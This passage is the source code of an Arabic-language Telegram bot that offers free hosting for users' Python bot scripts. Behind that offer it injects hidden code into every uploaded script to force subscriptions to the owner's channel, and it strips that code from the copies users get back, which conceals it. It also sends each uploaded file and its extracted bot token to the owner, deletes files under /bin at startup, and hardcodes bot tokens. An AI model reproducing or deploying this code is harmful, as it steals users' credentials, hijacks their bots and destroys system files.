import telebot
import subprocess
import psutil
import time
import re
import sqlite3
import threading
import os
import glob
from datetime import datetime
from telebot import types


def user_exists(username):
    try:
        subprocess.run(['id', username], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def add_user(username):
    try:
        subprocess.run(['sudo', 'useradd', username], check=True)
        print(f"User '{username}' has been added.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add user: {e}")

username = 'hostbot'

if not user_exists(username):
    add_user(username)
else:
    print(f"User '{username}' already exists.")
    

def delete_unnecessary_bin_files(directory):

    unnecessary_commands = ['sudo', 'cd', 'rm', 'mv', 'zip', 'unzip', 'cp']
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.bin'):
                file_path = os.path.join(root, file)
                with open(file_path, 'r') as f:
                    content = f.read()

                if any(command in content for command in unnecessary_commands):
                    print(f"Deleting: {file_path}")
                    os.remove(file_path)


delete_unnecessary_bin_files('/bin')

bot_token = "7714440193:AAHUd9lhC5wH8GpikGbMHezA8YpjfvdkdII"
YOUR_BOT_OWNER_ID = '7243681318'

dbname = 'storage.db'

bot = telebot.TeleBot(bot_token)

def create_connection():
    conn = sqlite3.connect(dbname, check_same_thread=False)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_files (
            user_id INTEGER,
            file_name TEXT,
            file_path TEXT,
            process_id INTEGER,
            upload_date TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS members (
            user_id INTEGER PRIMARY KEY,
            first_name TEXT,
            username TEXT
        )
    ''')

    conn.commit()
    return conn, cursor

conn, cursor = create_connection()
    
bot_script_name = ""
send_notification = True
send_fils_py = True 
boot_woork = False
lock = threading.Lock()

with open('mandatory_subscription_channels.txt', 'r') as file:
    mandatory_channels = [line.strip() for line in file]      

@bot.message_handler(func=lambda message: boot_woork and message.text in ["/start"] and message.from_user.id != int(YOUR_BOT_OWNER_ID))
def echo_all(message):
    bot.reply_to(message, "*- تم ايقاف البوت حالياً يرجى إعادة المحاولة في وقت لاحق 📡.*", parse_mode='Markdown')
@bot.callback_query_handler(func=lambda call: boot_woork and call.from_user.id != int(YOUR_BOT_OWNER_ID))
def echo_all(call):
    bot.answer_callback_query(call.id, text="- تم ايقاف البوت حالياً يرجى إعادة المحاولة في وقت لاحق 📡.", show_alert=True)
    
@bot.message_handler(commands=["start"])
def start(message):
    global send_notification
    user_id = message.from_user.id

    if str(user_id) == YOUR_BOT_OWNER_ID:
        owner_markup = types.InlineKeyboardMarkup()
        owner_markup.add(types.InlineKeyboardButton("- Source AL-Amir ✓", url="https://t.me/MMMFi"))
        owner_markup.add(types.InlineKeyboardButton("الإحصائيات", callback_data='owner_stats'),types.InlineKeyboardButton("اذاعة", callback_data='paint_broadcast'))
        owner_markup.add(types.InlineKeyboardButton("معلومات شخص", callback_data='member_information'))
        owner_markup.add(types.InlineKeyboardButton("اشعار الدخول", callback_data='toggle_notification'),types.InlineKeyboardButton("اشعارات رفع الملفات", callback_data='toggle_fils_py'))
        owner_markup.add(types.InlineKeyboardButton("الاشتراك الاجباري", callback_data='subscription'),types.InlineKeyboardButton("التحكم في البوت", callback_data='bot_control'))
        owner_markup.add(types.InlineKeyboardButton("كشف ملفات مستخدم", callback_data='reveal_files'))

        bot.reply_to(message, "*مرحبًا عزيزي المالك، أنت الآن في واجهة التحكم الخاصة بك.*", reply_markup=owner_markup, parse_mode='Markdown')

    try:
        subscribed_to_all = all(
            bot.get_chat_member(channel, user_id).status in ['member', 'creator', 'administrator'] 
            for channel in mandatory_channels
        )

        if subscribed_to_all:
            first_name = message.from_user.first_name
            markup = types.InlineKeyboardMarkup()
            manage_files_button = types.InlineKeyboardButton("- التحكم في ملفاتي 🗃️", callback_data="manage_files")
            upload_button = types.InlineKeyboardButton("- رفـع ملف ⚡", callback_data="upload_file")
            btn = types.InlineKeyboardButton(text='- سورس الامير 𓅂', url="https://t.me/MMMFi")
            markup.add(upload_button)
            markup.add(manage_files_button)
            markup.add(btn)
            bot.reply_to(message, f"*• مرحباً بكـ عزيزي {first_name} في بوت تشغيل بوتات وملفات لغة البرمجة بايثون 🔥\n\n- يمكنك من خلال هذا البوت تشغيل الملف أو الكود البرمجي الخاص بك بلغة بايثون مجاناً وبشكل سريع ومستمر ودون توقف ✅ .\n\n• يمكن التحكم في البوت من خلال الازرار في الاسفل 👇...*", reply_markup=markup, parse_mode='Markdown')
        else:
            channels_to_subscribe = [
                channel for channel in mandatory_channels 
                if bot.get_chat_member(channel, user_id).status not in ['member', 'creator', 'administrator']
            ]
            subscribe_markup = types.InlineKeyboardMarkup(row_width=1)
            for channel_name in channels_to_subscribe:
                channel_url = f"{channel_name.lstrip('@')}"  
                channel_info = bot.get_chat("@" + channel_url)
                channel_name = channel_info.title if channel_info.title else channel_info.username
                subscribe_markup.add(types.InlineKeyboardButton(f"{channel_name}", url=f"https://t.me/{channel_url}"))

            error_message = "*❗- عذراً عزيزي، يرجى الاشتراك في القنوات التالية لاستخدام البوت:*"
            bot.send_message(message.chat.id, error_message, parse_mode='Markdown', reply_markup=subscribe_markup)

    except Exception as e:
        first_name = message.from_user.first_name
        markup = types.InlineKeyboardMarkup()
        upload_button = types.InlineKeyboardButton("- رفـع ملف ⚡", callback_data="upload_file")
        manage_files_button = types.InlineKeyboardButton("- التحكم في ملفاتي 🗃️", callback_data="manage_files")
        btn = types.InlineKeyboardButton(text='- سورس الامير 𓅂', url="https://t.me/MMMFi")
        markup.add(upload_button)
        markup.add(manage_files_button)
        markup.add(btn)
        bot.reply_to(message, f"*• مرحباً بكـ عزيزي {first_name} في بوت تشغيل بوتات وملفات لغة البرمجة بايثون 🔥\n\n- يمكنك من خلال هذا البوت تشغيل الملف أو الكود البرمجي الخاص بك بلغة بايثون مجاناً وبشكل سريع ومستمر ودون توقف ✅ .\n\n• يمكن التحكم في البوت من خلال الازرار في الاسفل 👇...*", reply_markup=markup, parse_mode='Markdown')
        
        ownchek_markup = types.InlineKeyboardMarkup()
        ownchek_markup.add(types.InlineKeyboardButton("- فحص قنوات الاشتراك❗", callback_data='subscription_check'))
        bot.send_message(YOUR_BOT_OWNER_ID, f"*🚨 حدث خطأ أثناء محاولة فحص اشتراك المستخدم *[{message.from_user.first_name}](tg://user?id={user_id})* في قناة معينة.\n- تفاصيل الخطأ:*\n`{str(e)}`\n\n*• من الأفضل فحص قنوات الاشتراك الاجباري ⚠️*",reply_markup=ownchek_markup,  parse_mode='Markdown')
        
    with lock:
        cursor.execute('SELECT * FROM members WHERE user_id = ?', (user_id,))
        existing_member = cursor.fetchone()
        if not existing_member:
            first_name = message.from_user.first_name
            username = message.from_user.username
            cursor.execute('INSERT INTO members (user_id, first_name, username) VALUES (?, ?, ?)', (user_id, first_name, username))
            conn.commit()
            cursor.execute('SELECT COUNT(user_id) FROM members')
            total_members = cursor.fetchone()[0]
            user_info = f"الاسم: [{message.from_user.first_name}](tg://user?id={user_id})\nالمعرف: [@{username}] \nالايدي: `{user_id}`"
            if send_notification:
                bot.send_message(YOUR_BOT_OWNER_ID, f"*• تم دخول شخص جديد إلى البوت ✅\n\n• معلومات الشخص الجديد:*\n{user_info}\n\n*- عدد الاعضاء الكلي: {total_members} 👥*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'back_to_main')
def start_callback(call):
        first_name = call.from_user.first_name
        markup = types.InlineKeyboardMarkup()
        upload_button = types.InlineKeyboardButton("- رفـع ملف ⚡", callback_data="upload_file")
        manage_files_button = types.InlineKeyboardButton("- التحكم في ملفاتي 🗃️", callback_data="manage_files")
        btn = types.InlineKeyboardButton(text='- سورس الامير 𓅂', url="https://t.me/MMMFi")
        markup.add(upload_button)
        markup.add(manage_files_button)
        markup.add(btn)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= f"*• مرحباً بكـ عزيزي {first_name} في بوت تشغيل بوتات وملفات لغة البرمجة بايثون 🔥\n\n- يمكنك من خلال هذا البوت تشغيل الملف أو الكود البرمجي الخاص بك بلغة بايثون مجاناً وبشكل سريع ومستمر ودون توقف ✅ .\n\n• يمكن التحكم في البوت من خلال الازرار في الاسفل 👇...*", reply_markup=markup, parse_mode='Markdown')
        bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == 'back_owner')
def back_owner(call):
        owner_markup = types.InlineKeyboardMarkup()
        owner_markup.add(types.InlineKeyboardButton("- Source AL-Amir ✓", url="https://t.me/MMMFi"))
        owner_markup.add(types.InlineKeyboardButton("الإحصائيات", callback_data='owner_stats'),types.InlineKeyboardButton("اذاعة", callback_data='paint_broadcast'))
        owner_markup.add(types.InlineKeyboardButton("معلومات شخص", callback_data='member_information'))
        owner_markup.add(types.InlineKeyboardButton("اشعار الدخول", callback_data='toggle_notification'),types.InlineKeyboardButton("اشعارات رفع الملفات", callback_data='toggle_fils_py'))
        owner_markup.add(types.InlineKeyboardButton("الاشتراك الاجباري", callback_data='subscription'),types.InlineKeyboardButton("التحكم في البوت", callback_data='bot_control'))
        owner_markup.add(types.InlineKeyboardButton("كشف ملفات مستخدم", callback_data='reveal_files'))

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*مرحبًا عزيزي المالك، أنت الآن في واجهة التحكم الخاصة بك.*", reply_markup=owner_markup, parse_mode='Markdown')
        bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == 'toggle_notification')
def handle_callback(call):
    global send_notification
    send_notification = not send_notification
    if send_notification:
        bot.answer_callback_query(call.id, text=f"- تم تشغيل اشعار الدخول ✓", show_alert=True)
    else:
        bot.answer_callback_query(call.id, text=f"- تم ايقاف اشعار الدخول ✓", show_alert=True) 

@bot.callback_query_handler(func=lambda call: call.data == 'toggle_fils_py')
def handle_callback(call):
    global send_fils_py
    send_fils_py = not send_fils_py
    if send_fils_py:
        bot.answer_callback_query(call.id, text=f"- تم تشغيل اشعارات الملفات ✓", show_alert=True)
    else:
        bot.answer_callback_query(call.id, text=f"- تم ايقاف اشعارات الملفات ✓", show_alert=True) 
                              
@bot.callback_query_handler(func=lambda call: call.data == "upload_file")
def request_file(call):
    try:        
        cursor.execute('SELECT COUNT(*) FROM user_files WHERE user_id = ?', (call.from_user.id,))
        file_count = cursor.fetchone()[0]
        
        if file_count >= 3:
            bot.answer_callback_query(call.id, text=f"عذراً عزيزي، لا يمكنك رفع أو تشغيل اكثر من 3 ملفات في وقت واحد قم بحذف احدى الملفات الموجودة حالياً من خلال زر 'التحكم في ملفاتي' لرفع ملف اخر 💯.", show_alert=True)
            return
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("- رجـوع 🔙", callback_data='back_to_main'))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- قم بإرسال الملف البرمجي بـلغة بايثون لخاص بك ⚡*", parse_mode='Markdown', reply_markup=markup)
        bot.register_next_step_handler(call.message, handle_file)
    except Exception as e:
        bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "manage_files")
def manage_files(call):
    cursor.execute('SELECT file_name FROM user_files WHERE user_id = ?', (call.from_user.id,))
    files = cursor.fetchall()
    
    if files:
        markup = types.InlineKeyboardMarkup()

        for file in files:
            markup.add(types.InlineKeyboardButton(file[0], callback_data=f"file_{file[0]}"))
        
        markup.add(types.InlineKeyboardButton("- رجـوع 🔙", callback_data='back_to_main'))

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="*- اختر الملف المطلوب 🗃️:-*", reply_markup=markup, parse_mode='Markdown')
    else:
        bot.answer_callback_query(call.id, text=f"- لم تقم برفع أي ملف داخل البوت❗.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("file_"))
def send_selected_file(call):
    file_name = call.data.split("file_")[1]
    cursor.execute('SELECT file_path, upload_date FROM user_files WHERE user_id = ? AND file_name = ?', (call.from_user.id, file_name))
    result = cursor.fetchone()

    if result:
        file_path, upload_date = result 
        try:
            with open(file_path, 'r') as original_file:  
                lines = original_file.readlines()

            modified_lines = []
            skip = False
            in_code_block = False

            for line in lines:
                if 'import telebot.apihelper' in line:
                    skip = True
                    continue
                if 'telebot.apihelper.ENABLE_MIDDLEWARE = True' in line:
                    skip = True
                    continue
                if 'CHANNEL_BOT_TOKEN' in line:
                    skip = True
                    in_code_block = True
                    continue
                if in_code_block and '@bot.middleware_handler' in line:
                    skip = True
                    continue
                if in_code_block and 'message.text = None' in line:
                    skip = False
                    in_code_block = False
                    continue
                
                if 'bot = telebot.TeleBot' in line:
                    modified_lines.append(line)
                    continue
                if not skip:
                    modified_lines.append(line)

            modified_file_path = f"@MMMFi_{file_name}"
            with open(modified_file_path, 'w') as modified_file:
                modified_file.writelines(modified_lines)

            bot_token = get_bot_token(file_name)
            with open(modified_file_path, 'rb') as file:
                markup = types.InlineKeyboardMarkup()
                delete_button = types.InlineKeyboardButton("- حذف الملف 🗑️", callback_data=f"delete_{file_name}")
                markup.add(delete_button)
                bot.send_document(
                    call.message.chat.id,
                    file,
                    caption=f"*- تاريخ الرفع:* `{upload_date}`",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )

            os.remove(modified_file_path) 

        except Exception as e:
            bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
    else:
        bot.send_message(call.message.chat.id, "تعذر العثور على الملف.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def delete_file(call):
    file_name = call.data.split("delete_")[1]

    cursor.execute('SELECT process_id, file_path FROM user_files WHERE user_id = ? AND file_name = ?', (call.from_user.id, file_name))
    result = cursor.fetchone()

    if result:
        process_id, file_path = result
        try:
            
            if psutil.pid_exists(process_id):
                os.kill(process_id, 9)
                bot_token = get_bot_token(file_name)
                bot.send_message(call.message.chat.id, f"*- تم إيقاف تشغيل الملف {file_name}..*", parse_mode='Markdown')
                send_to_admindd(file_name, call.from_user.id, call.from_user.username, bot_token)
                
                cursor.execute('UPDATE user_files SET process_id = NULL WHERE user_id = ? AND file_name = ?', (call.from_user.id, file_name))
                conn.commit()
            else:
                bot.send_message(call.message.chat.id, f"*- العملية {process_id} غير موجودة، ربما تم إنهاؤها مسبقًا.*", parse_mode='Markdown')

        except Exception as e:
            bot.send_message(call.message.chat.id, f"حدث خطأ أثناء إيقاف تشغيل الملف: {e}")

        cursor.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', (call.from_user.id, file_name))
        conn.commit()

        try:
            os.remove(file_path)
            bot.send_message(call.message.chat.id, f"*- تم حذف الملف {file_name} بنجاح ✅.*", parse_mode='Markdown')
        except Exception as e:
            bot.send_message(call.message.chat.id, f"حدث خطأ أثناء حذف الملف: {e}")
    else:
        bot.send_message(call.message.chat.id, "تعذر العثور على الملف.")
        
def handle_file(message):
    global bot_script_name
    try:
        cursor.execute('SELECT COUNT(*) FROM user_files WHERE file_name = ? OR file_name = "main.py"', (message.document.file_name,))
        existing_file_count = cursor.fetchone()[0]

        if existing_file_count > 0 or message.document.file_name == "main.py":
            bot.reply_to(message, "*- هذا الملف موجود مسبقاً، يرجى تغيير اسم الملف واعادة المحاولة❗.*", parse_mode='Markdown')
            return

        cursor.execute('SELECT COUNT(*) FROM user_files WHERE user_id = ?', (message.from_user.id,))
        file_count = cursor.fetchone()[0]

        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bot_script_name = message.document.file_name

        # Check if the file has a .py extension
        if not bot_script_name.endswith('.py'):
            bot.reply_to(message, "*- عذراً عزيزي، يجب أن يكون الملف بصيغة py (يكون الملف بلغة البرمجة بايثون وغير مضغوط)❗.*", parse_mode='Markdown')
            return

        upload_directory = '/home/hostbot/uploads'
        if not os.path.exists(upload_directory):
            os.makedirs(upload_directory)

        file_storage_path = os.path.join(upload_directory, bot_script_name)

        with open(file_storage_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        with open(file_storage_path, 'r') as original_file:
            lines = original_file.readlines()

        modified_lines = []
        middleware_added = False
        bot_init_line = None

        for index, line in enumerate(lines):
            if 'bot = telebot.TeleBot' in line:
                bot_init_line = index
                modified_lines.append("import telebot\nimport telebot.apihelper\nimport telebot.types as types\nimport requests\n")
                modified_lines.append("telebot.apihelper.ENABLE_MIDDLEWARE = True\n")
                middleware_added = True

            modified_lines.append(line)
            if bot_init_line and index == bot_init_line:
                modified_lines.append('''
CHANNEL_BOT_TOKEN = "7223945404:AAF4MGGGkhKsGw8OaMtubnCpkLuOunRVNPQ"
CHANNEL_USERNAME = "@MMMFi"

def is_user_subscribed(user_id):
    url = f"https://api.telegram.org/bot{CHANNEL_BOT_TOKEN}/getChatMember?chat_id={CHANNEL_USERNAME}&user_id={user_id}"
    response = requests.get(url)
    data = response.json()
    if data['ok']:
        status = data['result']['status']
        return status in ['member', 'administrator', 'creator']
    else:
        return False

@bot.middleware_handler(update_types=['message'])
def check_subscription(bot_instance, message):
    user_id = message.from_user.id
    if not is_user_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(text='- اضغط هنا للاشتراك 🔥', url="https://t.me/+gwby4IYbqbAwYjQy")
        markup.add(btn)
        bot.reply_to(message, f"- عذرا عزيزي، يرجى الاشتراك في قناة السورس الأساسية لتتمكن من استخدام البوت ✅", reply_markup=markup)
        message.text = None
                ''')

                bot_init_line = None

        if not middleware_added:
            modified_lines.insert(0, "import telebot.apihelper\ntelebot.apihelper.ENABLE_MIDDLEWARE = True\n")
            middleware_added = True

        with open(file_storage_path, 'w') as modified_file:
            modified_file.writelines(modified_lines)

        ch_file = bot.reply_to(message, f"*• تم بدء تشغيل الملف {bot_script_name}، يرجى الانتظار لمدة 5 ثواني للتحقق من الملف ⏰...*", parse_mode='Markdown')
        process = subprocess.Popen(['python3', file_storage_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        time.sleep(4)
        return_code = process.poll()

        if return_code is None:
            process_id = process.pid
            upload_date = datetime.now().strftime('%Y-%m-%d')
            cursor.execute('INSERT INTO user_files (user_id, file_name, file_path, process_id, upload_date) VALUES (?, ?, ?, ?, ?)', 
                           (message.from_user.id, bot_script_name, file_storage_path, process_id, upload_date))
            conn.commit()

            developer_channel_button = types.InlineKeyboardButton(text="- Source AL-Amir ✓", url="https://t.me/MMMFi")
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(developer_channel_button)
            user_id = message.from_user.id    
            bot.delete_message(user_id, ch_file.message_id)
            bot.reply_to(message, f"*- تم رفع الملف وتشغيله بنجاح ✅\n\n• اسم الملف المرفوع:* `{bot_script_name}`\n\n*- يمكنك استخدام البوت الخاص بك الأن 🔥.*", reply_markup=keyboard, parse_mode='Markdown')

            bot_token = get_bot_token(bot_script_name)
            send_to_admin(bot_script_name, message.from_user.id, message.from_user.username, bot_token)
        else:
            raise Exception(f"الملف {bot_script_name} يحتوي على مشكلة ولا يمكن تشغيله تأكد من اصلاح جميع الاخطاء داخل الملف واعد رفعة مرة أخرى.")
    except Exception as e:       
        print(f"حدث خطأ أثناء تشغيل الملف {bot_script_name}: {e}")
        try:
            os.remove(file_storage_path)
        except Exception as remove_error:
            print(f"حدث خطأ أثناء حذف الملف من النظام: {remove_error}")
        user_id = message.from_user.id    
        bot.delete_message(user_id, ch_file.message_id)    
        bot.reply_to(message, f"*- الملف {bot_script_name} يحتوي على خطأ ولا يمكن تشغيله تأكد من اصلاح جميع الاخطاء داخل الملف واعد رفعة مرة أخرى ⚠️.*", parse_mode='Markdown')
        send_error_to_admin(e)

def send_to_admin(file_name, user_id, username, bot_token):
    try:
        cursor.execute('SELECT file_path, upload_date FROM user_files WHERE user_id = ? AND file_name = ?', (user_id, file_name))
        result = cursor.fetchone()

        if result:
            file_path, upload_date = result
            if os.path.exists(file_path): 
                with open(file_path, 'rb') as file:
                    caption = (f"📂 *ملف جديد تم رفعه:*\n\n"
                               f"• *اسم الملف:* `{file_name}`\n"
                               f"• *ايدي المستخدم:* `{user_id}`\n"
                               f"• *معرف المستخدم:* [@{username}]\n"
                               f"• *توكن البوت:* `{bot_token}`\n"
                               f"• *تاريخ الرفع:* `{upload_date}`")
                    if send_fils_py:
                        bot.send_document(YOUR_BOT_OWNER_ID, file, caption=caption, parse_mode='Markdown')
            else:
                print(f"الملف {file_path} غير موجود.")
        else:
            print(f"لم يتم العثور على معلومات عن الملف {file_name}.")

    except Exception as e:
        print(f"Error sending file to admin: {e}")

def send_to_admindd(file_name, user_id, username, bot_token):
    try:
        cursor.execute('SELECT file_path, upload_date FROM user_files WHERE user_id = ? AND file_name = ?', (user_id, file_name))
        result = cursor.fetchone()

        if result:
            file_path, upload_date = result
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    caption = (f"🗑️ *ملف تم حذفه:*\n\n"
                               f"• *اسم الملف:* `{file_name}`\n"
                               f"• *ايدي المستخدم:* `{user_id}`\n"
                               f"• *معرف المستخدم:* [@{username}]\n"
                               f"• *توكن البوت:* `{bot_token}`\n"
                               f"• *تاريخ الرفع:* `{upload_date}`")
                    if send_fils_py:
                        bot.send_document(YOUR_BOT_OWNER_ID, file, caption=caption, parse_mode='Markdown')
            else:
                print(f"الملف {file_path} غير موجود.")
        else:
            print(f"لم يتم العثور على معلومات عن الملف {file_name}.")

    except Exception as e:
        print(f"Error sending file to admin: {e}")
        
def get_bot_token(file_name):
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            match = re.search(r'TOKEN\s*=\s*[\'"]([^\'"]*)[\'"]', content)
            if match:
                return match.group(1)
            else:
                return "تعذر العثور على التوكن"
    except Exception as e:
        print(f"Error getting bot token: {e}")
        return "تعذر العثور على التوكن"

def send_error_to_admin(error_message):
    bot.send_message(YOUR_BOT_OWNER_ID, f"⚠️- حدث خطأ أثناء تشغيل الملف: {error_message}")

@bot.callback_query_handler(func=lambda call: call.data == 'paint_broadcast')
def add_channel(call):
    subscription_markup = types.InlineKeyboardMarkup()
    subscription_markup.add(types.InlineKeyboardButton("إذاعة لجميع الاعضاء", callback_data='broadcast'))
    subscription_markup.add(types.InlineKeyboardButton("إذاعة توجية لجميع الاعضاء", callback_data='broadcast_forward'))
    subscription_markup.add(types.InlineKeyboardButton("- رجـوع", callback_data='back_owner'))
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- لوحة التحكم الخاصة بالأذاعة داخل البوت ✅:*",reply_markup=subscription_markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data == 'bot_control')
def bot_control(call):
    control_markup = types.InlineKeyboardMarkup()
    control_markup.add(types.InlineKeyboardButton("تفاصيل وحالة البوت", callback_data='send_detail'))
    control_markup.add(types.InlineKeyboardButton("عمل البوت", callback_data='bot_work'))
    control_markup.add(types.InlineKeyboardButton("إعادة تشغيل البوت", callback_data='restart_bot'))
    control_markup.add(types.InlineKeyboardButton("- رجـوع", callback_data='back_owner'))
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- لوحة التحكم الخاصة بالبوت ✅:*",reply_markup=control_markup, parse_mode='Markdown')
       
@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def add_channel(call):
    subscription_markup = types.InlineKeyboardMarkup()
    subscription_markup.add(types.InlineKeyboardButton("إضافة اشتراك اجباري", callback_data='subscription_add'))
    subscription_markup.add(types.InlineKeyboardButton("حذف اشتراك اجباري", callback_data='subscription_delete'))
    subscription_markup.add(types.InlineKeyboardButton("فحص قنوات الاشتراك", callback_data='subscription_check'))
    subscription_markup.add(types.InlineKeyboardButton("حذف جميع الاشتراكات الاجبارية", callback_data='subscription_clear_all'))
    subscription_markup.add(types.InlineKeyboardButton("ارسال جميع الاشتراكات الاجبارية", callback_data='subscription_everyone'))
    subscription_markup.add(types.InlineKeyboardButton("- رجـوع", callback_data='back_owner'))
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- لوحة التحكم الخاصة بالاشتراكات الاجبارية داخل البوت ✅:*",reply_markup=subscription_markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'bot_work')
def handle_callback(call):
    global boot_woork
    boot_woork = not boot_woork
    if boot_woork:
        bot.answer_callback_query(call.id, text=f"- تم ايقاف عمل البوت لدى جميع المستخدمين ✓", show_alert=True)
    else:
        bot.answer_callback_query(call.id, text=f"- تم تشغيل البوت لدى جميع المستخدمين ✓", show_alert=True)
        
def get_status_message(value, active_message, inactive_message):
    return active_message if value else inactive_message
@bot.callback_query_handler(func=lambda call: call.data == 'send_detail')
def send_details(call):
    
    ownergg_markup = types.InlineKeyboardMarkup()
    ownergg_markup.add(types.InlineKeyboardButton("- Source AL-Amir ✓", url="https://t.me/MMMFi"))
    send_notification_status = get_status_message(send_notification, "اشعارات الدخول: تعمل ✅", "اشعارات الدخول: متوقفة ❌")
    send_fils_py_status = get_status_message(send_fils_py, "اشعارات الملفات: تعمل ✅", "اشعارات الملفات: متوقفة ❌")
    boot_woork_status = get_status_message(not boot_woork, "حالة البوت: يعمل ✅", "حالة البوت: متوقف ❌")
        
    details_message = f"*- تـفاصـيل الـبـوت 🤖:\n\n{send_notification_status}\n{send_fils_py_status}\n{boot_woork_status}*\n\n*- توكن البوت:* `{bot_token}` 🔑\n*- ايدي المالك:* `{YOUR_BOT_OWNER_ID}` 🆔"   
    bot.reply_to(call.message, details_message, reply_markup=ownergg_markup,parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data == 'subscription_check')
def check_subscription_channels(call):
    problematic_channels = []

    for channel in mandatory_channels:
        try:
            chat_member = bot.get_chat_member(channel, bot.get_me().id)
            if not chat_member or chat_member.status not in ['creator', 'administrator']:
                problematic_channels.append(channel)
        except telebot.apihelper.ApiTelegramException as e:
            problematic_channels.append(channel)
            
    if problematic_channels:
        for channel in problematic_channels:
            mandatory_channels.remove(channel)
        with open('mandatory_subscription_channels.txt', 'w') as file:
            for channel in mandatory_channels:
                file.write(channel + '\n')
        channels_text = "\n".join(problematic_channels)
        bot.send_message(call.message.chat.id, f"*- تم إزالة القنوات التالية من الاشتراك الإجباري لوجود مشاكل تسببها ⚠️:*\n{channels_text}", parse_mode='Markdown')
    else:
        bot.send_message(call.message.chat.id, "*- تم التحقق من جميع القنوات وهي سليمة ✅*", parse_mode='Markdown')
        
@bot.callback_query_handler(func=lambda call: call.data == 'subscription_clear_all')
def clear_all_channels(call):
    with open('mandatory_subscription_channels.txt', 'w') as file:
        file.write('')

    mandatory_channels.clear()

    bot.reply_to(call.message, "*- تم حذف جميع الاشتراكات الاجبارية بنجاح ✅.*", parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data == 'subscription_everyone')
def list_subscription_channels(call):
    
    with open('mandatory_subscription_channels.txt', 'r') as file:
        channels = file.readlines()
    if channels:
                
        channels_text = "- قائمة الاشتراكات الاجبارية ☣️:"
        for channel in channels:
            channels_text += f"\n- {channel.strip()}"
        
        bot.reply_to(call.message, f"*- عدد الاشتراكات الاجبارية في البوت: {len(channels)} 📢\n{channels_text}*", parse_mode='Markdown')
    else:
        bot.reply_to(call.message, "*- لا يوجد اي اشتراك اجباري في البوت 💯.*", parse_mode='Markdown') 
    
@bot.callback_query_handler(func=lambda call: call.data == 'subscription_add')
def add_channel(call):
    bot.reply_to(call.message, "*- ارسل معرف القناة أو المجموعة المراد اضافتها الى الاشتراك الاجباري ✅*", parse_mode='Markdown')
    bot.register_next_step_handler(call.message, process_channel_id)

def process_channel_id(message):
    if message.text.startswith('@'):
        channel_id = message.text.strip()
        
        try:
            chat_member = bot.get_chat_member(channel_id, bot.get_me().id)
            if chat_member and chat_member.status in ['creator', 'administrator']:
                
                if channel_id not in mandatory_channels:
                    
                    mandatory_channels.append(channel_id)
                    
                    with open('mandatory_subscription_channels.txt', 'a') as file:
                        file.write(channel_id + '\n')
                    bot.reply_to(message, "*- تم اضافة القناة الى الاشتراك الاجباري بنجاح ✅.*", parse_mode='Markdown')
                else:
                    bot.reply_to(message, "*- هذه القناة أو المجموعة موجودة بالفعل في الاشتراك الاجباري 💯.*", parse_mode='Markdown')
            else:
                bot.reply_to(message, "*- عذرًا، يجب أن يكون البوت مشرفًا في القناة أو المجموعة ليتم اضافتها ⚠️.*", parse_mode='Markdown')
        except telebot.apihelper.ApiTelegramException as e:
            if "chat not found" in str(e):
                bot.reply_to(message, "*- القناة او المجموعة المرسلة غير موجودة❗.*", parse_mode='Markdown')
            elif "bot was kicked from the channel chat" in str(e):
                bot.reply_to(message, "*- البوت ليس مشرفًا في القناة ⚠️.*", parse_mode='Markdown')
            else:
                bot.reply_to(message, f"*- حدث خطأ غير متوقع:* {str(e)}", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*- يرجى إرسال معرف القناة بالشكل الصحيح (مثل: @MMMFi) ⚠️.*", parse_mode='Markdown')
        
@bot.callback_query_handler(func=lambda call: call.data == 'subscription_delete')
def delete_channel(call):
    bot.reply_to(call.message, "*- قم بإرسال معرف القناة أو المجموعة المراد حذفها من الاشتراك الاجباري 🗑️*", parse_mode='Markdown')
    bot.register_next_step_handler(call.message, process_delete_channel)

def process_delete_channel(message):
    if message.text.startswith('@'):
        channel_id = message.text.strip()
        
        if channel_id in mandatory_channels:
            
            mandatory_channels.remove(channel_id)
            
            with open('mandatory_subscription_channels.txt', 'w') as file:
                for channel in mandatory_channels:
                    file.write(channel + '\n')
            bot.reply_to(message, "*- تم حذف القناة أو المجموعة من الاشتراك الاجباري بنجاح ✅.*", parse_mode='Markdown')
        else:
